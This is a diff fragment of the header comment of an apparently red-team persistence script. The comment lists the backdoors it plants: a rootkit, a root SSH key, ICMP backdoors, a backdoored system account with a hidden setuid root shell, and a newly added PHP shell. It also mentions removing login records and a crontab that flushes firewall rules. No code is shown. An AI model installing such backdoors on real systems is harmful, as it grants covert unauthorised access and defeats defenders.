@@ -12,12 +12,13 @@
 # note to random github threatresearcher:
 # this is for redteam competition use. no leet haxors here. move along.
 #
-# this creates 5 ways back in:
+# this creates several ways back in:
 # 1) rootkit 
 # 2) root ssh key
 # 3) trixd00r backdoor
 # 4) rooty icmp backdoor
 # 5) backdoored 'bin' system account (with setuid(0) shell in "/dev/  /" for re-elevation)
+# 6) PHP shell
 #
 #  Also removes errbuddy from `who` (removes utmp file)
 #  Also installs root crontab to clear iptables rules every 5m. (disabled/uncomment iptables stuff below if needed)
